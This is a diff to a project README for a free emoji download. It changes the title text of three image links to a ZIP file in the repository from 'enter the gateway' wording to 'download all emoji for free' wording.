@@ -21,7 +21,7 @@
 ###### Ever see an emoji like this ☃️ or this 🏹️ or this 💱️
 
 ## 🫶️ HOW ABOUT THIS!
-<a target="_self" title="CLICK HERE TO ENTER THE MERCWAR GATEWAY FREE!" href="https://github.com/mercwar/CVBGOD-EMOJI/raw/refs/heads/main/CVBGOD-EMOJI.zip">
+<a target="_self" title="CLICK HERE TO DOWNLINK ALL of THEE Emoji for FREE!" href="https://github.com/mercwar/CVBGOD-EMOJI/raw/refs/heads/main/CVBGOD-EMOJI.zip">
 <img 
     src="joetron.png" 
     alt="Mercwar FREE Emojiy" 
@@ -43,7 +43,7 @@
 * **Custom Branding & Executable Properties:** Ships with customized metadata, version info, and a custom application icon (`favicon.ico`).
 
 
-<a target="_self" title="CLICK HERE TO ENTER THE MERCWAR GATEWAY FREE!" href="https://github.com/mercwar/CVBGOD-EMOJI/raw/refs/heads/main/CVBGOD-EMOJI.zip">
+<a target="_self" title="CLICK HERE TO DOWNLINK ALL of THEE Emoji for FREE!" href="https://github.com/mercwar/CVBGOD-EMOJI/raw/refs/heads/main/CVBGOD-EMOJI.zip">
 <img 
     src="ChatGPT%20Image%20Oct%207%2C%202026%2C%2005_43_10%20PM.png" 
     alt="Mercwar FREE Emojiy" 
@@ -62,7 +62,7 @@
 
 ---
 
-<a target="_self" title="CLICK HERE TO ENTER THE MERCWAR GATEWAY FREE!" href="https://github.com/mercwar/CVBGOD-EMOJI/raw/refs/heads/main/CVBGOD-EMOJI.zip">
+<a target="_self" title="CLICK HERE TO DOWNLINK ALL of THEE Emoji for FREE!" href="https://github.com/mercwar/CVBGOD-EMOJI/raw/refs/heads/main/CVBGOD-EMOJI.zip">
 <img 
     src="aote.png" 
     alt="Mercwar FREE Emojiy" 
